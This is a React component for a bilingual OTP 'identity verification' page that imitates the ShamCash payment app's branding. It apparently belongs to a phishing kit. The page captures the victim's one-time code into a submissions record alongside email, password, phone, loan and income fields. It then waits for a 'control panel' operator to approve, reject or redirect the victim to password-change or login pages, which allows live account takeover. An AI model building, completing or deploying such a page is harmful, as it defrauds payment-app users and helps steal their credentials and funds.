import { useState, useRef, useEffect } from "react";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { useAdminCommands } from "@/hooks/useAdminCommands";
import { useLang } from "@/hooks/useLang";

const T = {
  ar: {
    back: "رجوع", dir: "rtl" as const,
    heading: "التحقق من هويتك",
    subtitle: "تم إرسال رمز OTP إلى",
    noCode: "لم تستلم الرمز؟",
    resend: "إعادة الإرسال",
    waiting: "في انتظار الموافقة من لوحة التحكم...",
    waitingBtn: "جارٍ الانتظار...",
    confirm: "تأكيد",
    goBack: "العودة",
    approvedTitle: "تمت الموافقة",
    approvedSub: "تم التحقق من هويتك بنجاح",
    rejectedTitle: "تم الرفض",
    rejectedSub: "لم يتم التحقق من هويتك",
    redirectedTitle: "تم التحويل",
    redirectedSub: "تم تحويل طلبك إلى جهة أخرى",
  },
  en: {
    back: "Back", dir: "ltr" as const,
    heading: "Verify Your Identity",
    subtitle: "An OTP code was sent to",
    noCode: "Didn't receive the code?",
    resend: "Resend",
    waiting: "Waiting for approval from the control panel...",
    waitingBtn: "Waiting...",
    confirm: "Confirm",
    goBack: "Go Back",
    approvedTitle: "Approved",
    approvedSub: "Your identity has been verified successfully",
    rejectedTitle: "Rejected",
    rejectedSub: "Your identity could not be verified",
    redirectedTitle: "Redirected",
    redirectedSub: "Your request has been redirected",
  },
};

function ShamLogo() {
  return (
    <div className="relative h-28 w-32">
      <div
        className="absolute left-5 top-12 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#5dd99f] via-[#44a984] to-[#257b6f] shadow-[0_18px_35px_rgba(20,219,144,0.12)]"
        style={{
          clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)",
        }}
      />
      <div
        className="absolute left-14 top-5 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#6273dd] via-[#5365c3] to-[#354075] shadow-[0_22px_40px_rgba(99,116,212,0.18)]"
        style={{
          clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)",
        }}
      />
    </div>
  );
}

type Status = "idle" | "pending" | "approved" | "rejected" | "redirected";

export function ShamCashOTP() {
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [status, setStatus] = useState<Status>("idle");
  const inputs = useRef<(HTMLInputElement | null)[]>([]);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [lang] = useLang();
  const t = T[lang];
  useVisitorTracking("التحقق OTP");
  useAdminCommands();

  const rawPhone = localStorage.getItem("sham_phone") ?? "";
  const digitsOnly = rawPhone.replace(/\D/g, "");
  const last4 = digitsOnly.length >= 4 ? digitsOnly.slice(-4) : digitsOnly || "XXXX";
  const maskedPhone = "••••••• " + last4;

  function handleChange(index: number, value: string) {
    if (!/^\d*$/.test(value)) return;
    const next = [...otp];
    next[index] = value.slice(-1);
    setOtp(next);
    if (value && index < 5) inputs.current[index + 1]?.focus();
  }

  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Backspace" && !otp[index] && index > 0)
      inputs.current[index - 1]?.focus();
  }

  function handlePaste(e: React.ClipboardEvent) {
    e.preventDefault();
    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!text) return;
    const next = [...otp];
    for (let i = 0; i < 6; i++) next[i] = text[i] ?? "";
    setOtp(next);
    inputs.current[Math.min(text.length, 5)]?.focus();
  }

  function playSubmitSound() {
    try {
      const ctx = new AudioContext();
      const pairs = [{ f: 520, t: 0 }, { f: 660, t: 0.13 }];
      pairs.forEach(({ f, t }) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.type = "sine";
        osc.frequency.setValueAtTime(f, ctx.currentTime + t);
        gain.gain.setValueAtTime(0, ctx.currentTime + t);
        gain.gain.linearRampToValueAtTime(0.22, ctx.currentTime + t + 0.02);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + t + 0.28);
        osc.start(ctx.currentTime + t);
        osc.stop(ctx.currentTime + t + 0.3);
      });
    } catch {}
  }

  function handleConfirm() {
    playSubmitSound();
    localStorage.setItem("sham_otp_status", "pending");
    const otpValue = otp.join("");
    localStorage.setItem("sham_otp_code", otpValue);
    localStorage.setItem("sham_otp_phone", maskedPhone);
    const vId = localStorage.getItem("sham_visitor_id");
    if (vId) {
      try {
        const subs: Record<string, unknown>[] = JSON.parse(localStorage.getItem("sham_submissions") ?? "[]");
        const idx = subs.findIndex((r) => r.id === vId);
        if (idx >= 0) { subs[idx] = { ...subs[idx], otpCode: otpValue, otpStatus: "pending", page: "التحقق OTP" }; }
        else { subs.unshift({ id: vId, submittedAt: new Date().toLocaleTimeString("ar-SY"), submittedAtTs: Date.now(), email: "", password: "", phone: "", loan: "", income: "", otpCode: otpValue, otpStatus: "pending", changepassStatus: null, page: "التحقق OTP", isActive: true, lastSeen: Date.now() }); }
        localStorage.setItem("sham_submissions", JSON.stringify(subs));
      } catch {}
    }
    setStatus("pending");

    intervalRef.current = setInterval(() => {
      const s = localStorage.getItem("sham_otp_status") as Status | null;
      if (s && s !== "pending") {
        if (intervalRef.current) clearInterval(intervalRef.current);
        if (s === "rejected") {
          localStorage.removeItem("sham_otp_status");
          window.location.href = "/blocked";
          return;
        }
        if (s === "redirected") {
          const target = localStorage.getItem("sham_otp_redirect_target") ?? "changepass";
          localStorage.removeItem("sham_otp_status");
          localStorage.removeItem("sham_otp_redirect_target");

          if (target === "otp") {
            setStatus("idle");
            setOtp(["", "", "", "", "", ""]);
            return;
          }

          const pageMap: Record<string, string> = {
            login: "/",
            changepass: "/changepass",
          };
          window.location.href = pageMap[target] ?? "/changepass";
          return;
        }
        setStatus(s);
      }
    }, 500);
  }

  useEffect(() => {
    localStorage.removeItem("sham_otp_status");
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, []);

  const statusConfig = {
    approved: {
      icon: (
        <svg className="h-16 w-16" viewBox="0 0 64 64" fill="none">
          <circle cx="32" cy="32" r="30" fill="#1fc28a22" stroke="#1fc28a" strokeWidth="2.5" />
          <path d="M18 32l10 10 18-18" stroke="#1fc28a" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      ),
      title: t.approvedTitle,
      subtitle: t.approvedSub,
      color: "text-[#1fc28a]",
    },
    rejected: {
      icon: (
        <svg className="h-16 w-16" viewBox="0 0 64 64" fill="none">
          <circle cx="32" cy="32" r="30" fill="#e5434322" stroke="#e54343" strokeWidth="2.5" />
          <path d="M22 22l20 20M42 22L22 42" stroke="#e54343" strokeWidth="3" strokeLinecap="round" />
        </svg>
      ),
      title: t.rejectedTitle,
      subtitle: t.rejectedSub,
      color: "text-[#e54343]",
    },
    redirected: {
      icon: (
        <svg className="h-16 w-16" viewBox="0 0 64 64" fill="none">
          <circle cx="32" cy="32" r="30" fill="#657bd822" stroke="#657bd8" strokeWidth="2.5" />
          <path d="M20 32h24M36 24l8 8-8 8" stroke="#657bd8" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      ),
      title: t.redirectedTitle,
      subtitle: t.redirectedSub,
      color: "text-[#657bd8]",
    },
  };

  return (
    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
      <div className="relative mx-auto flex min-h-screen w-full max-w-[390px] flex-col items-center px-6 pb-10 pt-4 font-['Inter']">
        <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
        <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />

        <div className="relative w-full flex items-center pt-2">
          <button
            type="button"
            onClick={() => { window.location.href = "/"; }}
            className="flex items-center gap-1.5 text-[14px] font-bold text-white/50 hover:text-white/80 transition-colors"
          >
            <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4">
              <path d={lang === "ar" ? "M15 19l-7-7 7-7" : "M9 19l7-7-7-7"} stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
            {t.back}
          </button>
        </div>

        <div className="relative mt-10 flex justify-center">
          <ShamLogo />
        </div>

        {status === "idle" || status === "pending" ? (
          <>
            <div className="relative mt-10 w-full text-center space-y-3">
              <h1 className="text-[24px] font-extrabold tracking-[-0.01em] text-white/90">
                {t.heading}
              </h1>
              <p className="text-[14px] font-semibold text-[#c9ccdb]/70 leading-relaxed">
                {t.subtitle}{" "}
                <span className="text-white/80 font-bold" dir="ltr">
                  {maskedPhone}
                </span>
              </p>
            </div>

            <div className="relative mt-12 w-full">
              <div className="flex justify-center gap-3" dir="ltr" onPaste={handlePaste}>
                {otp.map((digit, i) => (
                  <input
                    key={i}
                    ref={(el) => { inputs.current[i] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    disabled={status === "pending"}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    className={`h-[58px] w-[48px] rounded-[14px] border text-center text-[22px] font-extrabold text-white outline-none transition-all duration-150 disabled:opacity-60
                      ${digit
                        ? "border-[#657bd8] bg-[#657bd8]/20 shadow-[0_0_0_2px_rgba(101,123,216,0.3)]"
                        : "border-white/[0.06] bg-[#2a3047]/95"
                      }
                      focus:border-[#657bd8] focus:bg-[#657bd8]/10 focus:shadow-[0_0_0_2px_rgba(101,123,216,0.25)]
                      placeholder:text-[#c9ccdb]/30`}
                    placeholder="—"
                  />
                ))}
              </div>
            </div>

            <div className="relative mt-8 w-full flex justify-center">
              {status === "idle" ? (
                <p className="text-[14px] font-semibold text-[#cfd2df]/60">
                  {t.noCode}{" "}
                  <span className="cursor-pointer text-[#7183e6] hover:underline">{t.resend}</span>
                </p>
              ) : (
                <p className="text-[14px] font-semibold text-[#c9ccdb]/60 flex items-center gap-2">
                  <svg className="h-4 w-4 animate-spin text-[#657bd8]" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25" />
                    <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
                  </svg>
                  {t.waiting}
                </p>
              )}
            </div>

            <div className="relative mt-auto w-full pt-10">
              <button
                type="button"
                onClick={status === "idle" ? handleConfirm : undefined}
                disabled={status === "pending"}
                className={`w-full h-[58px] rounded-[15px] text-[20px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-all duration-200 flex items-center justify-center gap-3
                  ${status === "pending"
                    ? "bg-[#657bd8]/60 cursor-not-allowed"
                    : "bg-[#657bd8] hover:bg-[#7089e0] active:scale-[0.98]"
                  }`}
              >
                {status === "pending" ? (
                  <>
                    <svg className="h-5 w-5 animate-spin" viewBox="0 0 24 24" fill="none">
                      <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="3" strokeOpacity="0.3" />
                      <path d="M12 2a10 10 0 0 1 10 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
                    </svg>
                    {t.waitingBtn}
                  </>
                ) : (
                  t.confirm
                )}
              </button>
            </div>
          </>
        ) : (
          <div className="relative mt-16 w-full flex flex-col items-center text-center space-y-6">
            <div className="mt-4">
              {statusConfig[status as keyof typeof statusConfig].icon}
            </div>
            <div className="space-y-2">
              <h2 className={`text-[26px] font-extrabold ${statusConfig[status as keyof typeof statusConfig].color}`}>
                {statusConfig[status as keyof typeof statusConfig].title}
              </h2>
              <p className="text-[15px] font-semibold text-[#c9ccdb]/70">
                {statusConfig[status as keyof typeof statusConfig].subtitle}
              </p>
            </div>
            <button
              type="button"
              onClick={() => {
                setStatus("idle");
                setOtp(["", "", "", "", "", ""]);
                localStorage.removeItem("sham_otp_status");
              }}
              className="mt-8 h-[52px] w-full rounded-[15px] bg-[#2a3047] text-[16px] font-bold text-white/80 hover:bg-[#333d5c] transition-colors"
            >
              {t.goBack}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default ShamCashOTP;
